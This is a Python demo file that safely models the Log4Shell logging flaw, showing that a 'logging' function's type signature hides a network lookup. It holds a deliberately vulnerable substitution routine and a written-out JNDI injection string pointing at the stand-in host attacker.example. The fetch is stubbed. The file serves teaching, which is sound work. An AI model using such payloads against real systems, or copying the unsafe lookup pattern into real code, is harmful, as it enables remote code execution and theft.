"""The same log-call boundary in Python — it runs, no objection.

This is a SAFE model of the Log4Shell shape (no real LDAP/JNDI, no
network): the point is that Python's type system has nothing to say
about a "logging" function that reaches out. The signature
`handle_request(user_input: str) -> None` is silent on whether the
call may open a socket. mypy, ruff, and a human reviewer reading the
signature all approve. The exfil path is invisible at the call site —
exactly as it was in real Log4j 2.14.

Run:  python3 -B demos/case_studies/log4shell/python/vulnerable.py
"""
from __future__ import annotations


def jndi_resolve(uri: str) -> str:
    # In real Log4j this opened an LDAP connection and loaded a remote
    # class. Modeled here as a marker so the demo performs no network.
    return f"REMOTE_CLASS_FROM:{uri}"  # ponytail: marker, not a real fetch


def substitute(message: str) -> str:
    # Message-lookup substitution — the Log4j feature behind the CVE.
    if message.startswith("${jndi:"):
        return jndi_resolve(message)
    return message


def handle_request(user_input: str) -> None:
    # Reads as "just logs a line". Nothing in the type says otherwise.
    rendered = substitute(user_input)
    print(f"LOG {rendered}")


def main() -> int:
    handle_request("${jndi:ldap://attacker.example/exploit}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
